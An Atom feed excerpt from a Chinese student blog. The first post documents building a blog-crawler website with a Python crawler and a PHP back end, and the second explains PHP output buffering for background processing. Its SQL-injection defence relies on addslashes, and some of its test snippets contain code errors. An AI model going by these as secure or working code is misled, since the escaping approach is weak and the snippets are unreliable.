    <link href="https://someonesometimes.github.io/2017/06/29/%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E7%88%AC%E5%8F%96%E7%BD%91%E7%AB%99%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%B5%81%E7%A8%8B/"/>
    <id>https://someonesometimes.github.io/2017/06/29/一个博客爬取网站的设计思路与流程/</id>
    <published>2017-06-29T12:39:52.000Z</published>
    <updated>2017-10-01T16:43:37.014Z</updated>
    
    <content type="html"><![CDATA[<p>前后花了两个月的时间，终于把数据库课设做完了。。。考虑到wooyun关闭后各种wooyun资源dump的流行，加上正好最近在通过各个博客学习安全知识，就想着做一个博客爬取网站吧，首先是写出一个爬虫来爬取整个博客的文章，然后再展示出来。</p><p><img src="http://i.imgur.com/qNswEah.png" alt=""></p><p><img src="http://i.imgur.com/r2IDn4k.png" alt=""><br>这是网站的登陆界面，在左侧的文字概述了我做整个网站的初衷，希望做一个blog的收集平台，能够方便的爬取博客，然后展示这些dump下来的文章，以备wooyun那样的不测2333<br>对了，细心的同学应该能够发现，这个页面使用的是github的css文件</p><p>本篇文章我将从以下几方面对开发过程进行描述：</p><ul><li>爬虫的编写<ul><li>爬取逻辑</li><li>解析html以获取页面样式</li><li>入口参数检测以提高爬虫健壮性</li></ul></li><li>后端逻辑的实现<ul><li>php后台处理的实现</li><li>轮询来获取后台程序的运行进度</li><li>后台文件结构与设计</li></ul></li><li>网站安全性的考虑</li><li>样式设计（这方面我第一次接触，非常菜没什么好借鉴的。。。）</li><li>其他的一些问题<ul><li>整个网站的编码</li><li>页面标签事件触发后传this</li><li>使用中文智能分词实现模糊搜索</li></ul></li></ul><a id="more"></a><hr><h2 id="爬虫的编写"><a href="#爬虫的编写" class="headerlink" title="爬虫的编写"></a>爬虫的编写</h2><h3 id="首先是爬取逻辑"><a href="#首先是爬取逻辑" class="headerlink" title="首先是爬取逻辑"></a>首先是爬取逻辑</h3><p>我采用的是正则表达式匹配的方式，逻辑是这样的：维护一个目录列表，把博客初始链接放进去作为列表第一个成员，之后对目录列表进行遍历，解析链接中所有符合目录正则表达式的新的目录 url，并将新的目录 url增加到目录列表中，这样在循环结束后，就相当于把所有的目录页面都走了一遍。<br>同时在这个过程中，我们对每个链接的html文件可不只是扫描出符合目录正则表达式的链接，我们同时还会通过article正则表达式扫描出所有文章链接，并添加到文章列表。所以在对目录列表的整个遍历结束之后，我们不仅仅是遍历解析了所有的page页面，还获得了网站中所有的文章链接</p><h3 id="然后是对单个页面的样式，js代码，图片等的解析下载"><a href="#然后是对单个页面的样式，js代码，图片等的解析下载" class="headerlink" title="然后是对单个页面的样式，js代码，图片等的解析下载"></a>然后是对单个页面的样式，js代码，图片等的解析下载</h3><p>拿到所有的文章链接后，就是对文章的解析下载了，但是使用python下载链接只能拿到html文件，不包括css文件，js文件，图片这些其他的资源，如果想在本地离线使用的话，就需要解析下载下来，这里我首先使用python的BeautifulSoup模块对html进行了解析，使HTML文件变成可以操作的DOM形式。<br>之后我找了几个常见的博客文章样本进行分析，可以看到基本上需要下载的链接在<code>&lt;link&gt; &lt;img&gt; &lt;script&gt;</code>这几个标签的属性中，于是我就把这些标签都拿出来，从他们的属性中抓取要下载的链接，之后下载下来放到本地就可以了，具体抓那些属性，我都放到了配置文件中，可以随时修改抓取策略<br>通过上面的这种方式，抓取下来的页面基本能够还原原来网页的各种效果</p><h3 id="关于提高爬虫的健壮性"><a href="#关于提高爬虫的健壮性" class="headerlink" title="关于提高爬虫的健壮性"></a>关于提高爬虫的健壮性</h3><p>首先要确定由用户指定的对象，也就是程序输入点</p><ul><li>爬取的链接可能无法访问</li><li>用户提供的路径可能不存在或没有权限读写</li></ul><p>除此之外还会存在问题的对象</p><ul><li>本地存放是基于windows文件系统的，在命名上会有要求，在写完整个爬虫后，我最终正则表达式需要去过滤的字符有这些：[\/:*?\”&lt;&gt;|\x20\n\t\r\f\a]</li><li>在爬取中涉及到对html文件解析之后再下载，这些从页面中解析出来的链接可能存在问题</li></ul><p>还有一个之前没太注意过的问题：<br>因为爬取中需要对各种书写方式做出解析，所以用到了很多切片，分割等操作，就可能会存在溢出问题，比如说我想去掉<code>http://</code>，用str[7:]实现，在遇到不是<code>http://</code>格式的时候就会出现溢出问题。这些错误在进行各种程序输入统筹标准化的时候经常出现</p><p>在进行参数检测的时候，需要遵循的原则如下：</p><ul><li>尽量在参数入口进行检测，这样以后用的时候就不用再检测了</li><li>要仔细分析那些是来源不可靠的参数，尽量在他们出现的时候就进行参数检测</li></ul><hr><h2 id="后端逻辑的实现"><a href="#后端逻辑的实现" class="headerlink" title="后端逻辑的实现"></a>后端逻辑的实现</h2><h3 id="php后台处理的实现"><a href="#php后台处理的实现" class="headerlink" title="php后台处理的实现"></a>php后台处理的实现</h3><p>php调用爬虫的方式采用命令行的形式，在php中使用shell_exec()函数来对python爬虫进行调用，但是php程序不可能等待爬虫运行结束，处理的逻辑应该是：在爬虫开始前断开http链接，之后让爬虫自己去运行。具体的实现分析我在<a href="http://cauc.me/2017/06/20/php%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E4%B8%8Ehttp%E7%9A%84%E8%81%94%E7%B3%BB/" target="_blank" rel="external">php输出缓冲与http的联系</a>中已经做出了详细解释</p><h3 id="轮询读取后台程序进度"><a href="#轮询读取后台程序进度" class="headerlink" title="轮询读取后台程序进度"></a>轮询读取后台程序进度</h3><p>后台的程序在断开http链接之后就无法返回给前端任何信息了，这时用户对后台运行的程序无法掌控，对于这种情况，常见的解决方案是轮询或websocket，websocket一般在软件中使用，网站中经常使用轮询的方式。<br>所谓轮询，就是后台的程序把运行的实时进度都写到数据库中，然后在前端使用ajax来不断的去拿取数据库的信息来实现对后台运行程序的实时掌控，因为前端要不断的发起访问请求，所以叫轮询</p><p>为了减轻带宽与机子压力而采取的措施：</p><ul><li>在js获取更新资源的api函数中，将传输的更新资源在数据库中使用mysqli_fetch_row()获取而不使用mysqli_fetch_arrow()，这两个取出的结果，一个是列表格式，一个是字典格式的，自然列表格式的要更小</li><li>js获取更新资源后，在没有打开进度详情页面的时候，只更新主页面的通知图标，在打开进度详情页面的时候再对详情页面进行实时更新。可以避免对js对页面大量不必要的重写</li></ul><p>可能的更新：<br>关于cgi，fast-cgi这些关于php数据传输方式的名词<br>redist是个后台处理队列的扩展，可能经常在后台大规模计算的时候使用</p><h3 id="php后台文件结构与设计"><a href="#php后台文件结构与设计" class="headerlink" title="php后台文件结构与设计"></a>php后台文件结构与设计</h3><p><strong>因为是第一次写网站，参考火日的xss平台的文件目录，把网站的文件结构设计如下：</strong></p><ul><li>首先是存放静态文件的static文件夹，里面分为css，js，images，font四个文件夹，所有的引用都来自它们</li><li>两个php扩展文件，也放在同级目录下，在调用的时候直接require到对应的路径</li><li>将所有允许直接访问的php文件放到外层目录下</li><li>所有提供辅助功能，也就是让外层php调用的php文件，放到内层目录下，像config.php,function.php,sql.php,auth.php等,这些辅助文件有些像functioin.php，sql.php这样提供各种需要的函数，有些像auth.php,waf.php这样提供一段必要的执行代码</li></ul><p><strong>对于js发出请求的相响应设计</strong><br>这些响应逻辑都在api.php页面中实现，以api接口的形式实现，不做登陆检测，同时为了保证有些api的管理员才能调用特性，需要建立admin_api.php,做管理员登陆检测。<br>基本的api.php书写结构如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>( $_GET[<span class="string">'cmd'</span>]) &amp;&amp; $_GET[<span class="string">'cmd'</span>] != <span class="string">""</span> )&#123;</div><div class="line">    <span class="keyword">switch</span>( $_GET[<span class="string">'cmd'</span>] )&#123;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">'deleteblog'</span>:</div><div class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'blog'</span>]) &amp;&amp; $_GET[<span class="string">'blog'</span>] != <span class="string">""</span>)&#123;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">'deletecrawlerstate'</span>:</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'blog'</span>]) &amp;&amp; $_GET[<span class="string">'blog'</span>] != <span class="string">""</span>) &#123;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">'deletecrawler'</span>:</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'blog'</span>]) &amp;&amp; $_GET[<span class="string">'blog'</span>] != <span class="string">""</span>) &#123;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>除此之外，这些页面返回的数据建议使用json格式，也就是<code>echo(json_encode(变量))</code>，并且在程序开头指明<code>header(&#39;Content-Type: application/json&#39;);</code><br>这样在js接收中$.get(url,function(data, textstates, fn){ })中，data就是可以直接使用的变量格式<br>对了，要注意json只能接受utf编码格式的变量，如果php使用gb2312编码的话，需要转化为utf编码的</p><p><strong>访问控制如下设计:</strong><br>所有内层的辅助函数都禁止直接访问，这样实现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!defined(<span class="string">'IN_BLOG_PLATFORM'</span>))&#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">如果是管理员页面需要调用的话，还需要加上</div><div class="line"><span class="keyword">if</span>(!defined(<span class="string">'IS_ADMIN'</span>))&#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">这样的话，在直接访问的时候，就会因为没有定义宏变量而禁止访问</div></pre></td></tr></table></figure></p><p>外层的函数在所有入口点需要进行session检查，将所有未登录的访问都重定向到login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">这个函数在页面入口除了检查了$_SESSION[<span class="string">'isLogin'</span>]外还检查了user_agent值</div><div class="line"><span class="keyword">if</span> (!( <span class="keyword">isset</span>($_SESSION[<span class="string">'isLogin'</span>]) &amp;&amp; $_SESSION[<span class="string">'isLogin'</span>] === <span class="keyword">true</span> &amp;&amp;</div><div class="line">    <span class="keyword">isset</span>($_SESSION[<span class="string">'user_agent'</span>]) &amp;&amp; $_SESSION[<span class="string">'user_agent'</span>] === $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] ))&#123;</div><div class="line"></div><div class="line">    $_SESSION[<span class="string">'isLogin'</span>] = <span class="keyword">false</span>;</div><div class="line">    $_SESSION[<span class="string">'user_IP'</span>] = <span class="string">""</span>;</div><div class="line">    $_SESSION[<span class="string">'user_agent'</span>] = <span class="string">""</span>;</div><div class="line">    <span class="comment">//清空session会话，清除session变量，结束session会话</span></div><div class="line">    session_unset();</div><div class="line">    session_destroy();</div><div class="line">    header(<span class="string">"Location: login.php"</span>);</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">管理员页面需要在入口进行管理员检查，我是这样设计的</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) &amp;&amp; $_SESSION[<span class="string">'username'</span>] != <span class="string">""</span>)&#123;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!checkAdmin($mysqli, $_SESSION[<span class="string">'username'</span>]))&#123;</div><div class="line">        <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>综上所述，一个页面做出完整的访问控制需要添加如下功能代码：</p><ul><li>定义相应的宏变量，以引入需要的辅助函数<br><code>define(&quot;IN_BLOG_PLATFORM&quot;, true);</code></li><li>引入需要的辅助函数<br><code>require_once (&quot;./libs/waf.php&quot;);</code></li><li>设置http_only并开启session<br><code>ini_set(&quot;session.cookie_httponly&quot;, 1); session_start();</code></li><li>基于session中的值进行个各种检查，像是否登陆，user-agent是否符合等，只有在检查通过的时候才允许访问页面</li><li>链接数据库</li></ul><p><strong>表单提交中token的作用分析</strong><br>之前一直没有注意到过，见到火日师傅的xss平台中使用了，自己也就在表单提交中加上了，所谓表单提交中的token，指的是在表单中隐藏一行input，其值是随机生成的，并存放到session中，然后随着表单数据提交到服务端，服务端会对token值与存储在session的值进行比对，只有在相同的情况下才会继续往下执行<br>一开始使用这项功能的时候没能体会到什么作用，现在多少能理解一点了</p><ul><li>填写表单，提交表单这个流程必须人为完整的走下来才行，如果想直接提交表单参数的话，会因为没有token而被拒绝，这应该能够把很多自动化爬虫，暴力破解都拒之门外。</li><li>我在设计login.php, registe.php页面的时候，这些页面的处理逻辑基本上分成两种情况：一种是没有提交表单参数的，这是展示登陆界面，另一种是提交了表单参数的，这时执行登陆验证逻辑。而区分这两种情况的判断条件，我们可以采用检查token的方式：如果token存在并与session中的存储值相同，就判定为登陆验证情况，反之则为登陆页面展示情况</li></ul><hr><h2 id="网站安全性的考虑"><a href="#网站安全性的考虑" class="headerlink" title="网站安全性的考虑"></a>网站安全性的考虑</h2><p><strong>首先是关于数据库的</strong></p><ol><li><p>对所有的数据库入口参数做过滤，使用的过滤函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">d_addslashes</span><span class="params">(array $array)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">foreach</span>($array <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">        <span class="keyword">if</span>(!is_array($value))&#123;</div><div class="line">            <span class="comment">//查看php的魔术引号是否开启了，如果没有开启则使用addslashes函数自行改变所有的引号</span></div><div class="line">            !get_magic_quotes_gpc() &amp;&amp; $value=addslashes($value);</div><div class="line">            $array[$key]=$value;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $array[$key] = d_addslashes($array[$key]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $array;</div><div class="line">&#125;</div><div class="line">使用方式如下,比如要过滤$blog参数</div><div class="line"><span class="keyword">list</span>($blog) = d_addslashes([$blog]);</div></pre></td></tr></table></figure></li><li><p>对数据库返回的错误代码替换为自定义语句</p></li><li>尽量保证编码的一致性，因为数据处理流程中编码的转换可能导致某些字符的消失，详见ph师傅的文章，这个我的网站真的很难做到，php使用的gbk编码，数据库使用utf8编码。。</li></ol><p><strong>然后是关于访问控制的</strong><br>页面是怎么实现访问控制这点在之前已经叙述过了，除此之外，用户表中不存放明文密码防止拖库，存储密码hash的时候要加盐防止彩虹表攻击，然后应我们密码学老师的强烈要求，把所有的hash函数由md5换成了SHA3</p><p><strong>登陆机制防护</strong></p><ul><li>登陆表单中使用token应该可以在一定程度上防止暴力破解攻击，因为这时候你的暴力遍历速度最高只能和网络速度等同，一次尝试流程需要先接收html页面，从中拿到token值后才能提交尝试的表单</li><li>当然，防止暴力破解攻击，最有效的方式还是使用错误次数限制。在数据库中建立forbidden_ip表，登陆错误的时候将会记录下此ip，在错误次数达上线的时候，ip封禁</li></ul><p><strong>还有个比较有意思的点——记录user-agent</strong><br>在用户登录的时候记录user-agent的值到session中，然后所有的页面在登陆的时候都会与将访问者的user-agent字段与session中记录的值相比较，如果不相同的话就注销用户。<br>具体有什么作用，目前我发现的用处就是增加xss攻击获取cookie后冒充管理员登陆的难度，因为这时你必须要保证user-agent要和管理员所用的一样才行</p><hr><h2 id="样式设计"><a href="#样式设计" class="headerlink" title="样式设计"></a>样式设计</h2><p>好吧，界面样式的设计才是我花费时间最多的地方，虽然之前大一时学习过css但现在基本都忘了。<br>网站中的样式主要有以下来源</p><ul><li>去其他网站寻找符合页面结构的网页，之后F12分析下主要使用的css文件，然后把这些css dump下来，之后仿照着源网页的结构进行编排就好了，我的网站中，登陆与注册界面使用github登陆界面的css文件，admin页面使用的是腾讯云主页的css文件</li><li>对于某些元素，像按钮格式，表格格式这些，可以去网上直接下载模板css文件，书写的时候直接在class中加上对应的标志就好</li><li>还可能在其他页面看到好看的元素样式，可以F12分析后，把此元素的的css都复制下来，添加到我们的标签中。不过经常出现的情况是，你需要仔细分析到底是哪个标签藏着关键的css样式，毕竟一个标签可能有很多层div嵌套，常用的方法是在F12中依次把样式去掉看界面变化效果</li><li>最后实在不行我们可以自己手写嘛，使用bootstrap书写出来的页面还是说的过去的</li></ul><p>在页面中应该尽量使用百分比布局，这样在不同分辨率，不同窗口大小下都能灵活展示。我花费了很多时间，就是在调整页面的布局问题。直接使用其他网站的css文件并仿照div结构编写一般就不会出现这种问题</p><hr><h2 id="网站编写中其他的一些问题"><a href="#网站编写中其他的一些问题" class="headerlink" title="网站编写中其他的一些问题"></a>网站编写中其他的一些问题</h2><h3 id="网站整体编码"><a href="#网站整体编码" class="headerlink" title="网站整体编码"></a>网站整体编码</h3><p>php使用gb2312编码，所以在所有php页面要指定输出页面的编码方式<br><code>header(&quot;Content-type: text/html; charset=gb2312&quot;);</code><br>或者在html代码里加上<code>&lt;meta charset=&quot;gbk&quot;&gt;</code>。<br>当然我建议大家两种方式都写上以防万一</p><p>数据库存储使用utf-8编码，在调用数据库的时候需要指定连接编码方式<code>set names gbk;</code></p><p>api传输数据使用json编码，但是json只接受utf编码的数据，所以php编码要先转化为utf8编码方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">list_gbk_to_utf_8</span><span class="params">($data)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>( is_array($data) ) &#123;</div><div class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">            <span class="keyword">if</span> ( is_array($v) ) &#123;</div><div class="line">                $data[$k] = list_gbk_to_utf_8($v);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $data[$k] = iconv(<span class="string">'gb2312'</span>, <span class="string">'utf-8//IGNORE'</span>, ($data[$k]));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> $data;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $data = iconv(<span class="string">'gb2312'</span>, <span class="string">'utf-8//IGNORE'</span>,$data);</div><div class="line">        <span class="keyword">return</span> $data;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="页面标签事件触发后传this"><a href="#页面标签事件触发后传this" class="headerlink" title="页面标签事件触发后传this"></a>页面标签事件触发后传this</h3><p>页面中书写如下：<br><code>&lt;xxxx onclick=&quot;test(this)&quot;&gt;</code><br>script代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">(yiruma)</span></span>&#123;</div><div class="line">$(yiruma) 这就是触发响应的那个标签了，使用$()的方法是为了将yiruma标签从js格式转到jq格式</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="使用中文智能分词实现模糊搜索"><a href="#使用中文智能分词实现模糊搜索" class="headerlink" title="使用中文智能分词实现模糊搜索"></a>使用中文智能分词实现模糊搜索</h3><p>百度上可以查到，搜索引擎的模糊搜索是要先进行智能分词的，比如 恶意广告，会分为恶意 与 广告两个关键词，然后还要进行各种过滤匹配，这里我自己实现时暂且先不管那么多，毕竟不是专门做这个方向的，我只使用了中文智能分词的方式。<br>首先在github上找到了php端很流行的scws，使用这些代码提供的接口对搜索框输入的关键字进行分词，之后在每个分词间加上%，在数据库中做like搜索。比如恶意广告就是 <code>where name like &#39;%恶意%广告%&#39;</code>然后把搜索结果返回。<br>当然还有更多的算法，时间紧迫就先做这个最简单的，以后有时间再添加新的匹配规则。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前后花了两个月的时间，终于把数据库课设做完了。。。考虑到wooyun关闭后各种wooyun资源dump的流行，加上正好最近在通过各个博客学习安全知识，就想着做一个博客爬取网站吧，首先是写出一个爬虫来爬取整个博客的文章，然后再展示出来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/qNswEah.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/r2IDn4k.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;这是网站的登陆界面，在左侧的文字概述了我做整个网站的初衷，希望做一个blog的收集平台，能够方便的爬取博客，然后展示这些dump下来的文章，以备wooyun那样的不测2333&lt;br&gt;对了，细心的同学应该能够发现，这个页面使用的是github的css文件&lt;/p&gt;
&lt;p&gt;本篇文章我将从以下几方面对开发过程进行描述：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;爬虫的编写&lt;ul&gt;
&lt;li&gt;爬取逻辑&lt;/li&gt;
&lt;li&gt;解析html以获取页面样式&lt;/li&gt;
&lt;li&gt;入口参数检测以提高爬虫健壮性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;后端逻辑的实现&lt;ul&gt;
&lt;li&gt;php后台处理的实现&lt;/li&gt;
&lt;li&gt;轮询来获取后台程序的运行进度&lt;/li&gt;
&lt;li&gt;后台文件结构与设计&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;网站安全性的考虑&lt;/li&gt;
&lt;li&gt;样式设计（这方面我第一次接触，非常菜没什么好借鉴的。。。）&lt;/li&gt;
&lt;li&gt;其他的一些问题&lt;ul&gt;
&lt;li&gt;整个网站的编码&lt;/li&gt;
&lt;li&gt;页面标签事件触发后传this&lt;/li&gt;
&lt;li&gt;使用中文智能分词实现模糊搜索&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>php输出缓冲与http的联系</title>
    <link href="https://someonesometimes.github.io/2017/06/20/php%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E4%B8%8Ehttp%E7%9A%84%E8%81%94%E7%B3%BB/"/>
    <id>https://someonesometimes.github.io/2017/06/20/php输出缓冲与http的联系/</id>
    <published>2017-06-20T09:05:22.000Z</published>
    <updated>2017-06-20T10:11:46.404Z</updated>
    
    <content type="html"><![CDATA[<p>最近因为设计网站的时候需要实现一个后台处理的功能，在寻找解决方式的时候了解到了php输出缓冲的功能，让我第一次意识到http具体的传输数据都是什么流程（不会告诉你们我以前一直以为http只有一次数据传输的！），又get到一个新技能点，先记录下来，以后了解的多了再进一步补充吧<br><a id="more"></a></p><hr><h2 id="首先需要对以下函数有一定的了解"><a href="#首先需要对以下函数有一定的了解" class="headerlink" title="首先需要对以下函数有一定的了解"></a>首先需要对以下函数有一定的了解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line">获取当前php缓冲区的内容长度</div><div class="line">*/</div><div class="line">$size = ob_get_length()</div><div class="line"> </div><div class="line">/**</div><div class="line">刷新php的输出缓冲区，也就是将当前缓冲区中的数据通过http来传输过去</div><div class="line">然后至于这两个函数分别是什么功能。。我也不太清楚，网上倒是有不少介绍，反正就是一起用，起到刷新php</div><div class="line">输出缓冲区的作用</div><div class="line">*/</div><div class="line">flush()</div><div class="line">ob_flush()</div><div class="line"></div><div class="line">/**</div><div class="line">指定一个http流程中，一共需要接收多少数据，注意如果接收者还没有接收到指定的数据长度的时候就不会关闭</div><div class="line">http链接，也就是浏览器窗口一直处于加载中的小圆圈</div><div class="line">*/</div><div class="line">header(&quot;Content-Length: xxx&quot;);</div><div class="line"></div><div class="line">/**</div><div class="line">指定一个http链接到目前接收的数据为止是否要关闭，但测试中发现，如果浏览器接受的数据没有达到指定长度</div><div class="line">的时候，就算告诉了要关闭连接，http链接依然不会中断，所以我们在接下来实现中断http功能的过程中我们就</div><div class="line">主要使用header(&quot;Content-Length: xxx&quot;);来实现，这个指定Connection状态的语句加不加随意吧</div><div class="line">*/</div><div class="line">header(&quot;Connection: close/keep-alive&quot;);</div><div class="line"></div><div class="line">/*</div><div class="line">指定脚本在失去http连接之后是否仍然要运行,也就是是否继续在后台运行。有一点要指明的是脚本不会注意到</div><div class="line">http链接已经关闭，除非尝试echo一下，才能发现无法往缓冲区输出数据了</div><div class="line">*/</div><div class="line">ignore_user_abort(true);</div><div class="line"></div><div class="line">/*</div><div class="line">用于指定脚本的运行时限，0就是不限时间，因为想要后台运行的php脚本往往需要大量的时间，如果使用默认的</div><div class="line">时间限制可能导致异常终止</div><div class="line">*/</div><div class="line">set_time_limit(0);</div></pre></td></tr></table></figure><h2 id="下面开始通过测试来分析php输出与http的关系"><a href="#下面开始通过测试来分析php输出与http的关系" class="headerlink" title="下面开始通过测试来分析php输出与http的关系"></a>下面开始通过测试来分析php输出与http的关系</h2><p><strong>测试一</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">echo &quot;hahaha&quot;;</div><div class="line">sleep(10);</div><div class="line">echo &quot;hahaha&quot;;</div></pre></td></tr></table></figure></p><p>结果：浏览器在等待了10s后接收到了一次数据，为”hahahahahaha”,看来php将两次数据都输出后统一进行了一次http传输<br></p><p><strong>测试二</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">echo &quot;hahaha&quot;;</div><div class="line">ob_flush();</div><div class="line">flush();</div><div class="line"></div><div class="line">sleep(10s);</div><div class="line"></div><div class="line">echo &quot;hahaha&quot;;</div></pre></td></tr></table></figure></p><p>结果：浏览器很快就接收到了第一次返回的数据————“hahaha”,又等待了10S后，返回了剩下的数据”hahaha”</p><p><strong>测试三</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">echo &quot;hahaha&quot;;</div><div class="line">$size = ob_get_size();</div><div class="line">header(Content-Length: &#123;$size&#125;);</div><div class="line">flush();</div><div class="line">ob_flush();</div><div class="line"></div><div class="line">echo &quot;hahaha&quot;;</div></pre></td></tr></table></figure></p><p>结果:浏览器很快就接收到了第一次返回的数据————“hahaha”,然后就停止了。原因就是我们通过指定这次传输中Content-Length的方式，让浏览器认为接收的数据已经够了，所以就终止了连接</p><p><br><br><strong>综上所述</strong></p><ul><li>我们可以通过flush(); ob_flush();来php输出缓存区的内容释放，然后进行一次http传输</li><li>我们还可以在这次传输中通过指定header头Content-Length的方式来使整个的http链接终止</li><li>然后我们还可以通过指定ignore_user_abort(true);来使php程序在http链接终止的时候继续运行，并为其设置运行时间限制set_time_limit(0);</li></ul><p>以上就是实现php后台处理的思路啦</p>]]></content>
    
    <summary type="html">
    
